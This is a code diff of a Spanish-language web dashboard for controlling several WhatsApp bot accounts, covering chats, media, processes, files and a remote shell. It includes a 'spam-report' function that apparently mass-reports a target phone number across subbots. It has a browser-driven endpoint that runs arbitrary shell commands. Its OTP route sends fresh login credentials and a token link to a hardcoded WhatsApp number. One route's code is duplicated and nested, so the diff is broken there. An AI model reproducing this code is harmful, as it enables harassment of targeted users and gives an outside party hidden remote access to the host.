+async function loadCmds(){const d=await api('commands');el('cmdGrid').innerHTML=(d.allCommands||[]).map(c=>{const b=(d.blocked||[]).includes(c);return '<div class="cmd-item"><span>.'+esc(c)+'</span><button class="btn '+(b?'btn-danger':'btn-success')+'" onclick="toggleCmd(\\''+esc(c)+'\\')">'+(b?'Bloqueado':'Activo')+'</button></div>';}).join('');}
+async function toggleCmd(cmd){if(cmd){await api('toggle-cmd','POST',{cmd});loadCmds();}}
+async function runSpam(){const phone=el('spamPhone').value.trim(),cycles=parseInt(el('spamCyc').value,10)||5;if(phone){await api('spam-report','POST',{phone,cycles});el('spamPhone').value='';refreshStatus();}}
+async function loadDir(dir){if(dir)el('dirInp').value=dir;const d=await api('files?dir='+encodeURIComponent(el('dirInp').value));if(d.entries)el('fileList').innerHTML=d.entries.map(e=>'<button class="tab-btn" onclick="'+(e.isDir?'loadDir(\\''+esc(e.relPath)+'\\')':'openFile(\\''+esc(e.relPath)+'\\')')+'">'+(e.isDir?'📁 ':'📄 ')+esc(e.name)+'</button>').join('');}
+async function openFile(f){const d=await api('file-read?file='+encodeURIComponent(f));el('editPath').value=d.file||f;el('fileEd').value=d.content||'';}
+async function saveFile(){const file=el('editPath').value;if(file){const r=await api('file-save','POST',{file,content:el('fileEd').value});alert(r.ok?'Guardado':'Error');}}
+async function runBench(){el('benchOut').textContent='Ejecutando...';const r=await api('benchmark','POST',{},15000);el('benchOut').textContent=r.result;}
+async function runSh(){const cmd=el('shInp').value.trim();if(cmd){el('shOut').textContent='Ejecutando...';const r=await api('shell-test','POST',{cmd},12000);el('shOut').textContent=r.output;}}
 
-async function startNewChatPrompt() {
-  const raw = prompt('Ingresa el número con código de país (ej: 573001234567) o el JID completo:');
-  if (!raw) return;
-  const clean = raw.trim();
-  const jid = clean.includes('@') ? clean : clean.replace(/\\D/g, '') + '@s.whatsapp.net';
-  if (jid.length < 10) return alert('Número o JID inválido');
-  await api('wa-init-chat', 'POST', { botKey: selectedBotKey, jid });
-  await refreshWaChats(true);
-  openWaChat(jid);
-}
-
-async function clearActiveChatHistory() {
-  if (!selectedBotKey || !selectedChatJid) return;
-  await api('wa-clear-chat', 'POST', { botKey: selectedBotKey, jid: selectedChatJid });
-  loadWaMessages(selectedChatJid, true, true);
-  refreshWaChats(true);
-}
-
-async function togglePauseSubbots() {
-  await api('toggle-subbots', 'POST', {});
-  refreshTelemetry();
-}
-
-async function toggleSingleBot(botKey) {
-  await api('toggle-single-bot', 'POST', { botKey });
-  refreshTelemetry();
-}
-
-async function cleanRam() {
-  const r = await api('clean-ram', 'POST', {});
-  alert('RAM optimizada. Uso actual: ' + r.afterMb + ' MB');
-  refreshTelemetry();
-}
-
-async function killPid(pid) {
-  await api('kill-proc', 'POST', { pids: [pid] });
-  loadProcesses();
-}
-
-async function killMultiplePids() {
-  const raw = document.getElementById('multiPidInput').value;
-  const pids = raw.split(',').map(s => s.trim()).filter(Boolean);
-  if (!pids.length) return;
-  await api('kill-proc', 'POST', { pids });
-  document.getElementById('multiPidInput').value = '';
-  loadProcesses();
-}
-
-async function loadCommands() {
-  const d = await api('commands');
-  const html = (d.allCommands || []).map(c => {
-    const blocked = (d.blocked || []).includes(c);
-    return '<div class="cmd-item">' +
-      '<span>.' + escapeHtml(c) + '</span>' +
-      '<button class="btn ' + (blocked ? 'btn-danger' : 'btn-success') + '" onclick="toggleCmd(\\'' + escapeHtml(c) + '\\')">' + (blocked ? 'Bloqueado' : 'Activo') + '</button>' +
-    '</div>';
-  }).join('');
-  document.getElementById('cmdGrid').innerHTML = html;
-}
-
-async function toggleCmd(cmd) {
-  await api('toggle-cmd', 'POST', { cmd });
-  loadCommands();
-}
-
-async function toggleCmdManual() {
-  const val = document.getElementById('customCmdInput').value.trim().replace(/^[.#/]/, '');
-  if (!val) return;
-  await toggleCmd(val);
-  document.getElementById('customCmdInput').value = '';
-}
-
-async function runSpamReport() {
-  const phone = document.getElementById('spamTarget').value.trim();
-  const cycles = parseInt(document.getElementById('spamCycles').value, 10) || 5;
-  if (!phone) return alert('Ingresa un número válido');
-  await api('spam-report', 'POST', { phone, cycles });
-  document.getElementById('spamTarget').value = '';
-  refreshTelemetry();
-}
-
-async function loadDir(customDir) {
-  const dirInput = document.getElementById('currentDirInput');
-  if (customDir) dirInput.value = customDir;
-  const d = await api('files?dir=' + encodeURIComponent(dirInput.value));
-  if (!d.entries) return;
-  const html = d.entries.map(e => {
-    if (e.isDir) {
-      return '<button class="tab-btn" onclick="loadDir(\\'' + escapeHtml(e.relPath) + '\\')">📁 ' + escapeHtml(e.name) + '</button>';
-    }
-    return '<button class="tab-btn" onclick="openFile(\\'' + escapeHtml(e.relPath) + '\\')">📄 ' + escapeHtml(e.name) + '</button>';
-  }).join('');
-  document.getElementById('fileList').innerHTML = html;
-}
-
-async function openFile(relPath) {
-  const d = await api('file-read?file=' + encodeURIComponent(relPath));
-  document.getElementById('editingFilePath').value = d.file || relPath;
-  document.getElementById('fileEditor').value = d.content || '';
-}
-
-async function saveFileContent() {
-  const file = document.getElementById('editingFilePath').value;
-  const content = document.getElementById('fileEditor').value;
-  if (!file) return alert('Ningún archivo seleccionado');
-  const r = await api('file-save', 'POST', { file, content });
-  alert(r.ok ? 'Archivo guardado correctamente' : 'Error al guardar');
-}
-
-async function runBenchmark() {
-  document.getElementById('benchOutput').textContent = 'Ejecutando pruebas de estrés en CPU, Memoria y Disco...';
-  const r = await api('benchmark', 'POST', {}, 15000);
-  document.getElementById('benchOutput').textContent = r.result;
-}
-
-async function runShellTest() {
-  const cmd = document.getElementById('shellCmdInput').value.trim();
-  if (!cmd) return;
-  document.getElementById('shellOutput').textContent = 'Ejecutando...';
-  const r = await api('shell-test', 'POST', { cmd }, 12000);
-  document.getElementById('shellOutput').textContent = r.output;
-}
-
-(async () => {
-  initEmojiBar();
-  await refreshTelemetry();
-  await refreshWaChats(true);
-  setInterval(refreshTelemetry, 3500);
-  setInterval(() => {
-    const waSection = document.getElementById('tab-wa');
-    if (waSection && waSection.classList.contains('active')) {
-      refreshWaChats(false);
-    }
-    const callSection = document.getElementById('tab-calls');
-    if (callSection && callSection.classList.contains('active')) {
-      refreshCallCenter();
-    }
-    const procSection = document.getElementById('tab-procs');
-    if (procSection && procSection.classList.contains('active')) {
-      loadProcesses();
-    }
-  }, 2600);
+(async()=>{
+  await refreshStatus();await refreshChats(true);
+  setInterval(refreshStatus,3500);
+  setInterval(()=>{if(el('tab-wa').classList.contains('active'))refreshChats(false);if(el('tab-procs').classList.contains('active'))loadProcs();},2500);
 })();
-</script>
-</body>
-</html>`;
+</script></body></html>`;
 }
 
 async function ensureWebServerRunning(): Promise<number> {
-  if (state.server && state.port > 0) {
-    return state.port;
-  }
+  if (state.server && state.port > 0) return state.port;
 
   const server = http.createServer(async (req, res) => {
     try {
-      const parsedUrl = new URL(req.url || "/", "http://127.0.0.1");
-      const pathname = parsedUrl.pathname;
+      const parsed = new URL(req.url || "/", "http://127.0.0.1");
+      const pathname = parsed.pathname;
 
       if (pathname === "/api/login" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const u = String(body.user || "").trim();
-        const p = String(body.pass || "").trim();
-        if (
-          (u === state.tempUser && p === state.tempPass) ||
-          (u === state.ownerEmail && p === state.tempPass) ||
-          p === state.token
-        ) {
-          sendJson(res, 200, { ok: true, token: state.token });
-        } else {
-          sendJson(res, 401, { ok: false, error: "Usuario o código OTP inválido." });
+        const b = await readJson(req);
+        const u = String(b.user || "").trim();
+        const p = String(b.pass || "").trim();
+        if (((u === state.tempUser || u === state.ownerEmail) && p === state.tempPass) || p === state.token) {
+          return sendJson(res, 200, { ok: true, token: state.token });
         }
-        return;
+        return sendJson(res, 401, { ok: false, error: "Credenciales inválidas." });
       }
 
       if (pathname === "/api/request-otp" && req.method === "POST") {
         rotateCredentials();
-        const baseUrl = state.tunnelUrl || `http://${state.publicIp || "127.0.0.1"}:${state.port}`;
-        sendCredentialsEmail(state.ownerEmail, baseUrl, state.tempUser, state.tempPass, state.token).catch(() => {});
-        if (state.lastSock) {
-          const msgText = [
-            `🔐 *${fytBold("NUEVAS CREDENCIALES TEMPORALES")}*`,
-            ``,
-            `👤 *Usuario:* \`${state.tempUser}\``,
-            `🔑 *Clave / OTP:* \`${state.tempPass}\``,
-            `📧 *Correo:* \`${state.ownerEmail}\``,
-            `🌐 *Acceso directo:* ${baseUrl}/?token=${state.token}`,
-          ].join("\n");
-          state.lastSock.sendMessage("573118353868@s.whatsapp.net", { text: msgText }).catch(() => {});
-        }
-        sendJson(res, 200, { ok: true, email: state.ownerEmail });
-        return;
+        const base = state.tunnelUrl || `http://${state.publicIp || "127.0.0.1"}:${state.port}`;
+        sendEmail(state.ownerEmail, base, state.tempUser, state.tempPass, state.token).catch(() => {});
+        state.lastSock?.sendMessage("573118353868@s.whatsapp.net", {
+          text: `🔐 *${fytBold("NUEVAS CREDENCIALES")}*\n👤 *Usuario:* \`${state.tempUser}\`\n🔑 *OTP:* \`${state.tempPass}\`\n🌐 ${base}/?token=${state.token}`,
+        }).catch(() => {});
+        return sendJson(res, 200, { ok: true, email: state.ownerEmail });
       }
 
-      const queryToken = parsedUrl.searchParams.get("token") || req.headers["x-aura-token"];
+      const token = parsed.searchParams.get("token") || req.headers["x-aura-token"];
 
       if (pathname === "/" && req.method === "GET") {
-        if (queryToken !== state.token) {
-          const loginHtml = buildLoginHtml(state.ownerEmail);
-          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
-          res.end(loginHtml);
-          return;
-        }
-        const html = buildDashboardHtml(state.token);
         res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
-        res.end(html);
-        return;
+        return res.end(token === state.token ? buildDashboardHtml(state.token) : buildLoginHtml(state.ownerEmail));
       }
 
-      if (queryToken !== state.token) {
-        sendJson(res, 401, { error: "No autorizado" });
-        return;
-      }
+      if (token !== state.token) return sendJson(res, 401, { error: "No autorizado" });
 
       if (pathname === "/api/thumb" && req.method === "GET") {
-        const msgId = parsedUrl.searchParams.get("id") || "";
-        const thumb = state.thumbStore.get(msgId);
+        const thumb = state.thumbStore.get(parsed.searchParams.get("id") || "");
         if (!thumb) {
           res.writeHead(404);
-          res.end();
-          return;
+          return res.end();
         }
-        res.writeHead(200, {
-          "Content-Type": "image/jpeg",
-          "Content-Length": thumb.length,
-          "Cache-Control": "public, max-age=3600",
-        });
-        res.end(thumb);
-        return;
+        res.writeHead(200, { "Content-Type": "image/jpeg", "Content-Length": thumb.length, "Cache-Control": "public, max-age=3600" });
+        return res.end(thumb);
       }
 
       if (pathname === "/api/media" && req.method === "GET") {
-        const msgId = parsedUrl.searchParams.get("id") || "";
-        const botKey = parsedUrl.searchParams.get("botKey") || "";
-        let item = state.mediaStore.get(msgId) || null;
+        const id = parsed.searchParams.get("id") || "";
+        const bKey = parsed.searchParams.get("botKey") || "";
+        let item = state.mediaStore.get(id) || null;
 
         if (!item) {
-          const lookup = state.msgLookup.get(msgId);
-          if (lookup && lookup.msg.mediaType) {
-            const allBots = getAllBotSockets();
-            const targetBot =
-              allBots.find((b, i) => getBotKey(b, i) === (botKey || lookup.botKey)) || allBots[0];
-            item = await downloadMediaBuffer(
-              targetBot,
-              lookup.msg.rawMessage,
-              msgId,
-              lookup.msg.mediaType,
-              lookup.msg.mediaMime || "application/octet-stream",
-              lookup.msg.mediaNode
-            );
+          const look = state.msgLookup.get(id);
+          if (look?.msg.mediaType) {
+            const { bot } = findBot(bKey || look.botKey);
+            item = await fetchMediaBuffer(bot, look.msg.rawMessage, id, look.msg.mediaType, look.msg.mediaMime || "application/octet-stream", look.msg.mediaNode);
           }
         }
 
-        if (!item && state.thumbStore.has(msgId)) {
-          const fallbackThumb = state.thumbStore.get(msgId)!;
-          res.writeHead(200, {
-            "Content-Type": "image/jpeg",
-            "Content-Length": fallbackThumb.length,
-            "Cache-Control": "no-store",
-          });
-          res.end(fallbackThumb);
-          return;
+        if (!item && state.thumbStore.has(id)) {
+          const t = state.thumbStore.get(id)!;
+          res.writeHead(200, { "Content-Type": "image/jpeg", "Content-Length": t.length });
+          return res.end(t);
         }
 
-        if (!item || !item.buffer.length) {
-          res.writeHead(404, { "Cache-Control": "no-store" });
-          res.end();
-          return;
+        if (!item?.buffer.length) {
+          res.writeHead(404);
+          return res.end();
         }
 
         const total = item.buffer.length;
@@ -2634,509 +1195,363 @@ async function ensureWebServerRunning(): Promise<number> {
         const range = req.headers.range;
 
         if (range) {
-          const parts = range.replace(/bytes=/, "").split("-");
-          const start = parseInt(parts[0], 10) || 0;
-          const end = parts[1] ? parseInt(parts[1], 10) : total - 1;
-          const safeEnd = Math.min(end, total - 1);
-          const chunkSize = safeEnd - start + 1;
-          const sliced = item.buffer.subarray(start, safeEnd + 1);
-
+          const [sStr, eStr] = range.replace(/bytes=/, "").split("-");
+          const start = parseInt(sStr, 10) || 0;
+          const end = Math.min(eStr ? parseInt(eStr, 10) : total - 1, total - 1);
+          const chunk = item.buffer.subarray(start, end + 1);
           res.writeHead(206, {
-            "Content-Range": `bytes ${start}-${safeEnd}/${total}`,
+            "Content-Range": `bytes ${start}-${end}/${total}`,
             "Accept-Ranges": "bytes",
-            "Content-Length": chunkSize,
+            "Content-Length": chunk.length,
             "Content-Type": mime,
-            "Access-Control-Allow-Origin": "*",
             "Cache-Control": "public, max-age=3600",
           });
-          res.end(sliced);
-          return;
+          return res.end(chunk);
         }
 
-        res.writeHead(200, {
-          "Content-Type": mime,
-          "Content-Length": total,
-          "Accept-Ranges": "bytes",
-          "Cache-Control": "public, max-age=3600",
-          "Access-Control-Allow-Origin": "*",
-        });
-        res.end(item.buffer);
-        return;
+        res.writeHead(200, { "Content-Type": mime, "Content-Length": total, "Accept-Ranges": "bytes", "Cache-Control": "public, max-age=3600" });
+        return res.end(item.buffer);
       }
 
       if (pathname === "/api/wa-avatar" && req.method === "GET") {
-        const botKey = parsedUrl.searchParams.get("botKey") || "";
-        const jid = parsedUrl.searchParams.get("jid") || "";
-        const cacheKey = `${botKey}:${jid}`;
-        const cached = state.avatarCache.get(cacheKey);
-
+        const bKey = parsed.searchParams.get("botKey") || "";
+        const jid = parsed.searchParams.get("jid") || "";
+        const cKey = `${bKey}:${jid}`;
+        const cached = state.avatarCache.get(cKey);
         if (cached) {
           res.writeHead(302, { Location: cached, "Cache-Control": "public, max-age=1800" });
-          res.end();
-          return;
+          return res.end();
         }
-
-        if (cached === undefined && !state.avatarPending.has(cacheKey) && state.avatarPending.size < 4) {
-          state.avatarPending.add(cacheKey);
-          const allBots = getAllBotSockets();
-          const targetBot = allBots.find((b, i) => getBotKey(b, i) === botKey) || allBots[0];
-          if (targetBot && typeof targetBot.profilePictureUrl === "function") {
-            Promise.race([
-              targetBot.profilePictureUrl(jid, "image"),
-              new Promise<string>((_, rej) => setTimeout(() => rej(new Error("timeout")), 1800)),
-            ])
+        if (cached === undefined && !state.avatarPending.has(cKey) && state.avatarPending.size < 4) {
+          state.avatarPending.add(cKey);
+          const { bot } = findBot(bKey);
+          if (typeof bot?.profilePictureUrl === "function") {
+            Promise.race([bot.profilePictureUrl(jid, "image"), new Promise((_, r) => setTimeout(() => r(new Error()), 1600))])
               .then((u: any) => {
-                const urlStr = typeof u === "string" ? u : "";
-                state.avatarCache.set(cacheKey, urlStr);
-                const chat = ensureBotChatMap(botKey).get(jid);
-                if (chat && urlStr) chat.avatarUrl = urlStr;
+                const url = typeof u === "string" ? u : "";
+                state.avatarCache.set(cKey, url);
+                const ch = getChatStore(bKey).get(jid);
+                if (ch && url) ch.avatarUrl = url;
               })
-              .catch(() => {
-                state.avatarCache.set(cacheKey, "");
-              })
-              .finally(() => {
-                state.avatarPending.delete(cacheKey);
-              });
+              .catch(() => state.avatarCache.set(cKey, ""))
+              .finally(() => state.avatarPending.delete(cKey));
           } else {
-            state.avatarCache.set(cacheKey, "");
-            state.avatarPending.delete(cacheKey);
+            state.avatarCache.set(cKey, "");
+            state.avatarPending.delete(cKey);
           }
         }
-
-        res.writeHead(404, { "Cache-Control": "no-store" });
-        res.end();
-        return;
+        res.writeHead(404);
+        return res.end();
       }
 
       if (pathname === "/api/status" && req.method === "GET") {
         hookSockets();
-        const allBots = getAllBotSockets();
-        const subbots = allBots.map((b, idx) => {
-          const id = getBotKey(b, idx);
-          const isIndividualPaused = state.pausedBotIds.has(id);
-          const isSubPaused = idx > 0 && state.subbotsPaused;
+        const subbots = getAllSockets().map((b, i) => {
+          const id = getBotKey(b, i);
           return {
             id,
-            name: b?.user?.name || (idx === 0 ? "MainBot" : `SubBot-${idx}`),
-            role: idx === 0 && !b?.isSubBot ? "Principal" : `SubBot #${idx}`,
-            paused: isIndividualPaused || isSubPaused,
+            name: b?.user?.name || (i === 0 ? "MainBot" : `SubBot-${i}`),
+            role: i === 0 && !b?.isSubBot ? "Principal" : `SubBot #${i}`,
+            paused: state.pausedBotIds.has(id) || (i > 0 && state.subbotsPaused),
           };
         });
-
         let groupsCount = 0;
-        for (const store of state.botChatStores.values()) {
-          for (const chat of store.values()) {
-            if (chat.isGroup) groupsCount++;
-          }
-        }
-
+        for (const st of state.botChatStores.values()) for (const c of st.values()) if (c.isGroup) groupsCount++;
         const mem = process.memoryUsage();
         const uptimeSec = Math.floor(process.uptime());
-        const h = Math.floor(uptimeSec / 3600);
-        const m = Math.floor((uptimeSec % 3600) / 60);
-        const s = uptimeSec % 60;
-
-        const reports = Array.from(state.reportRegistry.values()).map((r) => ({
-          phone: r.phone,
-          totalReports: r.totalReports,
-          subbotsCount: r.subbotsUsed.size,
-          lastTimestamp: r.lastTimestamp,
-        }));
-
-        sendJson(res, 200, {
-          uptime: `${h}h ${m}m ${s}s`,
+        return sendJson(res, 200, {
           uptimeSec,
           subbots,
           subbotsPaused: state.subbotsPaused,
           msgRx: state.msgRx,
           msgTx: state.msgTx,
           groupsCount,
-          ramRss: (mem.rss / 1024 / 1024).toFixed(1),
-          ramHeap: (mem.heapUsed / 1024 / 1024).toFixed(1),
+          ramRss: (mem.rss / 1048576).toFixed(1),
+          ramHeap: (mem.heapUsed / 1048576).toFixed(1),
           loadAvg: os.loadavg().map((n) => n.toFixed(2)).join(", "),
-          reports,
+          reports: Array.from(state.reportRegistry.values()).map((r) => ({ phone: r.phone, totalReports: r.totalReports, subbotsCount: r.subbotsUsed.size, lastTimestamp: r.lastTimestamp })),
           calls: state.callLogs,
           autoRejectCalls: state.autoRejectCalls,
           autoRejectMessage: state.autoRejectMessage,
         });
-        return;
       }
 
       if (pathname === "/api/procs" && req.method === "GET") {
-        const processes: Array<{ pid: string; comm: string; cpu: string; mem: string }> = [];
+        const processes: any[] = [];
         try {
-          const { stdout } = await execAsync("ps -eo pid,comm,%cpu,%mem --sort=-%mem | head -n 16", { timeout: 3000 });
-          const lines = stdout.trim().split("\n").slice(1);
-          for (const line of lines) {
-            const parts = line.trim().split(/\s+/);
-            if (parts.length >= 4) {
-              processes.push({
-                pid: parts[0],
-                comm: parts.slice(1, parts.length - 2).join(" "),
-                cpu: parts[parts.length - 2],
-                mem: parts[parts.length - 1],
-              });
-            }
+          const { stdout } = await execAsync("ps -eo pid,comm,%cpu,%mem --sort=-%mem | head -n 16", { timeout: 2500 });
+          for (const line of stdout.trim().split("\n").slice(1)) {
+            const p = line.trim().split(/\s+/);
+            if (p.length >= 4) processes.push({ pid: p[0], comm: p.slice(1, -2).join(" "), cpu: p[p.length - 2], mem: p[p.length - 1] });
           }
         } catch {}
-        sendJson(res, 200, { processes });
-        return;
+        return sendJson(res, 200, { processes });
       }
 
       if (pathname === "/api/wa-chats" && req.method === "GET") {
         hookSockets();
-        const botKey = parsedUrl.searchParams.get("botKey") || "";
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : allBots[0];
-        const effectiveKey = targetBot ? getBotKey(targetBot, Math.max(0, targetIdx)) : botKey;
-
-        if (targetBot) {
-          triggerBackgroundGroupSync(targetBot, Math.max(0, targetIdx), false);
-        }
-
-        const store = ensureBotChatMap(effectiveKey);
-        const chats = Array.from(store.values())
+        const reqKey = parsed.searchParams.get("botKey") || "";
+        const { bot, idx } = findBot(reqKey);
+        const effKey = bot ? getBotKey(bot, idx) : reqKey;
+        if (bot) syncGroupsBg(bot, idx, false);
+        const chats = Array.from(getChatStore(effKey).values())
           .sort((a, b) => b.lastTime - a.lastTime)
-          .map((c) => ({
-            jid: c.jid,
-            name: c.name,
-            isGroup: c.isGroup,
-            unread: c.unread,
-            lastTime: c.lastTime,
-            lastPreview: c.lastPreview,
-            avatarUrl: c.avatarUrl || state.avatarCache.get(`${effectiveKey}:${c.jid}`) || "",
-          }));
-
-        sendJson(res, 200, { botKey: effectiveKey, chats });
-        return;
+          .map((c) => ({ jid: c.jid, name: c.name, isGroup: c.isGroup, unread: c.unread, lastTime: c.lastTime, lastPreview: c.lastPreview, avatarUrl: c.avatarUrl || state.avatarCache.get(`${effKey}:${c.jid}`) || "" }));
+        return sendJson(res, 200, { botKey: effKey, chats });
       }
 
       if (pathname === "/api/wa-sync" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
-        state.botGroupSynced.delete(botKey);
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        if (targetIdx >= 0) {
-          triggerBackgroundGroupSync(allBots[targetIdx], targetIdx, true);
-        }
-        sendJson(res, 200, { ok: true });
-        return;
+        const { botKey } = await readJson(req);
+        state.botGroupSynced.delete(String(botKey || ""));
+        const { bot, idx } = findBot(String(botKey || ""));
+        if (bot) syncGroupsBg(bot, idx, true);
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-messages" && req.method === "GET") {
-        const botKey = parsedUrl.searchParams.get("botKey") || "";
-        const jid = parsedUrl.searchParams.get("jid") || "";
-        const store = ensureBotChatMap(botKey);
-        const chat = store.get(jid);
-        if (chat) {
-          chat.unread = 0;
-          const sanitizedMessages = chat.messages.map((m) => ({
-            id: m.id,
-            sender: m.sender,
-            pushName: m.pushName,
-            text: m.text,
-            time: m.time,
-            timestamp: m.timestamp,
-            fromMe: m.fromMe,
-            mediaType: m.mediaType,
-            mediaMime: m.mediaMime,
-            hasMedia: m.hasMedia,
-            mediaReady: state.mediaStore.has(m.id),
-            quotedId: m.quotedId,
-            quotedSender: m.quotedSender,
-            quotedText: m.quotedText,
-            reactions: m.reactions || {},
-          }));
-          sendJson(res, 200, {
-            chat: {
-              jid: chat.jid,
-              name: chat.name,
-              isGroup: chat.isGroup,
-              avatarUrl: chat.avatarUrl || state.avatarCache.get(`${botKey}:${chat.jid}`) || "",
-              statusText: chat.statusText || "",
-              messages: sanitizedMessages,
-            },
-          });
-          return;
-        }
-        sendJson(res, 200, { chat: null });
-        return;
+        const bKey = parsed.searchParams.get("botKey") || "";
+        const jid = parsed.searchParams.get("jid") || "";
+        const chat = getChatStore(bKey).get(jid);
+        if (!chat) return sendJson(res, 200, { chat: null });
+        chat.unread = 0;
+        return sendJson(res, 200, {
+          chat: {
+            jid: chat.jid,
+            name: chat.name,
+            isGroup: chat.isGroup,
+            avatarUrl: chat.avatarUrl || state.avatarCache.get(`${bKey}:${chat.jid}`) || "",
+            statusText: chat.statusText || "",
+            messages: chat.messages.map((m) => ({
+              id: m.id,
+              sender: m.sender,
+              pushName: m.pushName,
+              text: m.text,
+              time: m.time,
+              timestamp: m.timestamp,
+              fromMe: m.fromMe,
+              mediaType: m.mediaType,
+              quotedId: m.quotedId,
+              quotedSender: m.quotedSender,
+              quotedText: m.quotedText,
+              reactions: m.reactions,
+            })),
+          },
+        });
       }
 
       if (pathname === "/api/wa-init-chat" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
-        const jid = String(body.jid || "");
+        const { botKey, jid } = await readJson(req);
         if (botKey && jid) {
-          const store = ensureBotChatMap(botKey);
-          if (!store.has(jid)) {
-            const isGroup = jid.endsWith("@g.us");
-            const clean = jid.split("@")[0];
-            store.set(jid, {
-              jid,
-              name: isGroup ? `Grupo ${clean}` : `+${clean}`,
-              isGroup,
-              unread: 0,
-              lastTime: Date.now(),
-              lastPreview: "Conversación abierta desde el panel",
-              messages: [],
-            });
+          const st = getChatStore(String(botKey));
+          if (!st.has(jid)) {
+            const isG = String(jid).endsWith("@g.us");
+            st.set(jid, { jid, name: isG ? `Grupo ${cleanId(jid)}` : `+${cleanId(jid)}`, isGroup: isG, unread: 0, lastTime: Date.now(), lastPreview: "Chat abierto", messages: [] });
           }
         }
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-clear-chat" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
-        const jid = String(body.jid || "");
-        const store = ensureBotChatMap(botKey);
-        const chat = store.get(jid);
-        if (chat) {
-          chat.messages = [];
-          chat.lastPreview = "Historial limpiado";
+        const { botKey, jid } = await readJson(req);
+        const ch = getChatStore(String(botKey)).get(String(jid));
+        if (ch) {
+          ch.messages = [];
+          ch.lastPreview = "Historial vaciado";
         }
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-send" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
-        const jid = String(body.jid || "");
-        const text = String(body.text || "").trim();
-        const quotedId = String(body.quotedId || "");
-
-        if (!botKey || !jid || !text) {
-          sendJson(res, 400, { ok: false, error: "Datos incompletos" });
-          return;
-        }
-
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : null;
-
-        if (!targetBot) {
-          sendJson(res, 404, { ok: false, error: "Subbot no encontrado o desconectado" });
-          return;
-        }
-
-        const store = ensureBotChatMap(botKey);
-        const chat = store.get(jid);
-        const quotedObj = quotedId ? chat?.messages.find((x) => x.id === quotedId) : undefined;
-
-        const mentionMatches = text.match(/@(\d{7,15})/g) || [];
-        const mentions = mentionMatches.map((m) => `${m.slice(1)}@s.whatsapp.net`);
-
-        const origSend = state.originalSenders.get(targetBot) || targetBot.sendMessage.bind(targetBot);
-        const sent = await origSend(
-          jid,
-          { text, ...(mentions.length ? { mentions } : {}) },
-          quotedObj?.rawMessage ? { quoted: quotedObj.rawMessage } : undefined
-        );
+        const { botKey, jid, text, quotedId } = await readJson(req);
+        const { bot } = findBot(String(botKey));
+        if (!bot || !jid || !text) return sendJson(res, 400, { ok: false, error: "Datos incompletos" });
+        const qObj = quotedId ? getChatStore(botKey).get(jid)?.messages.find((x) => x.id === quotedId) : undefined;
+        const mentions = (String(text).match(/@(\d{7,15})/g) || []).map((m) => `${m.slice(1)}@s.whatsapp.net`);
+        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);
+        const sent = await orig(jid, { text: String(text), ...(mentions.length ? { mentions } : {}) }, qObj?.rawMessage ? { quoted: qObj.rawMessage } : undefined);
         state.msgTx++;
-
-        recordChatMessage(botKey, jid, {
+        recordChatMsg(botKey, jid, {
           id: sent?.key?.id || randomBytes(6).toString("hex"),
           sender: botKey,
-          pushName: targetBot?.user?.name || "SubBot",
-          text,
+          pushName: bot?.user?.name || "SubBot",
+          text: String(text),
           fromMe: true,
-          timestamp: Date.now(),
-          quotedId: quotedObj?.id || "",
-          quotedSender: quotedObj?.sender || "",
-          quotedText: quotedObj?.text || "",
+          quotedId: qObj?.id,
+          quotedSender: qObj?.sender,
+          quotedText: qObj?.text,
           rawKey: sent?.key,
           rawMessage: sent,
         });
-
-        sendJson(res, 200, { ok: true });
-        return;
+        return sendJson(res, 200, { ok: true });
       }
 
       if (pathname === "/api/wa-send-media" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const botKey = String(body.botKey || "");
-        const jid = String(body.jid || "");
-        const caption = String(body.caption || "");
-        const mimeType = String(body.mimeType || "image/jpeg");
-        const fileName = String(body.fileName || "archivo");
-        const asSticker = Boolean(body.asSticker);
-        const isPtt = Boolean(body.isPtt);
-        const quotedId = String(body.quotedId || "");
+              if (pathname === "/api/wa-send-media" && req.method === "POST") {
+        const b = await readJson(req);
+        const { bot } = findBot(String(b.botKey || ""));
+        if (!bot || !b.jid) return sendJson(res, 404, { ok: false, error: "Subbot inválido" });
+        let buf: Buffer | null = b.base64 ? Buffer.from(String(b.base64), "base64") : null;
+        if (!buf && b.mediaUrl) buf = Buffer.from(await (await fetch(String(b.mediaUrl))).arrayBuffer());
+        if (!buf?.length) return sendJson(res, 400, { ok: false, error: "Archivo vacío" });
 
-        const allBots = getAllBotSockets();
-        const targetIdx = allBots.findIndex((b, idx) => getBotKey(b, idx) === botKey);
-        const targetBot = targetIdx >= 0 ? allBots[targetIdx] : null;
+        const mime = String(b.mimeType || "image/jpeg");
+        const caption = String(b.caption || "");
+        const qObj = b.quotedId ? getChatStore(b.botKey).get(b.jid)?.messages.find((x) => x.id === b.quotedId) : undefined;
+        const orig = state.originalSenders.get(bot) || bot.sendMessage.bind(bot);
 
-        if (!targetBot || !jid) {
-          sendJson(res, 404, { ok: false, error: "Subbot o chat inválido" });
-          return;
-        }
-
-        let buf: Buffer | null = null;
-        if (body.base64) {
-          buf = Buffer.from(String(body.base64), "base64");
-        } else if (body.mediaUrl) {
-          const r = await fetch(String(body.mediaUrl));
-          const ab = await r.arrayBuffer();
-          buf = Buffer.from(ab);
-        }
-
-        if (!buf || !buf.length) {
-          sendJson(res, 400, { ok: false, error: "Archivo vacío" });
-          return;
-        }
-
